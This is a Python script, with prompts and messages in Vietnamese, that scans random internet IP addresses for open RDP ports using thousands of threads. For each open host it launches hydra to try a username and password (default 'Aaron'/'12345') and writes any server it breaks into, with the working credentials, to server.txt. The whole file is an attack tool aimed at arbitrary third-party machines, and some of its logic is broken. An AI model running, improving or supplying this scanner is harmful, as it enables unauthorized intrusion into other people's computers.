import threading
import random
import socket
import time
import os
import platform

system_name = platform.system()
log = []

class ScaningIP:
    def random_ip(self):
        g1 = str(random.choice([i for i in range(253)]))
        g2 = str(random.choice([i for i in range(253)]))
        g3 = str(random.choice([i for i in range(253)]))
        g4 = str(random.choice([i for i in range(253)]))
        return f"{g1}.{g2}.{g3}.{g4}"

    def check_rdps(self, hostname, port=3389):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((hostname, port))
            if result == 0:
                result = "open"
            else:
                result = "closed"
            s.close()
        except Exception as e:
            pass
        return result


    def scan(self, user="Aaron", passw="12345"):
        ip = self.random_ip()
        if ip in log:
            return
        check_rdp = None
        try:
            check_rdp = self.check_rdps(hostname=ip)
        except:
            return "error"
        if check_rdp in "open":
            print(f"Địa chỉ : {ip}  Trạng thái RDP : {check_rdp}")
            result = os.popen(f"hydra -t 1 -l {user} -p {passw} rdp://{ip}").read()
            result = int(result.split("completed, ")[1].split(" valid password")[0])
            if result == 1:
                print("Một máy chủ đã gục ngã vào giỏ :>")
                with open("server.txt", "a", encoding="utf-8") as file:
                    log.append(ip)
                    file.write(f"Địa chỉ : {ip}  Trạng thái RDP : {check_rdp} MK: {passw} USER: {user}\n")
    
    def scan_rdp_ip(self, th=10000, user="Aaron", passw="12345"):
        while True:
            threads = []
            for i in range(th):
                t = threading.Thread(target=self.scan, args=(user, passw))
                threads.append(t)
                time.sleep(0.01)
                t.start()
            for t in threads:
                t.join()

thread_num = input("nhập số luồng mặc định 10000, gõ d để chọn mặc định hoặc nhập số lượng : ").strip()
if thread_num in "d":
    thread_num = 10000
else:
    thread_num = int(thread_num)
user = input("nhập user, mặc định là Aaron gõ d để chọn mặc định hoặc nhập user : ").strip()
if user in "d":
    user = "Aaron"
passw = input("nhập password, mặc định là 12345 gõ d để chọn mặc định hoặc nhập pass : ").strip()
if passw in "d":
    passw = "12345"
ScaningIP().scan_rdp_ip()
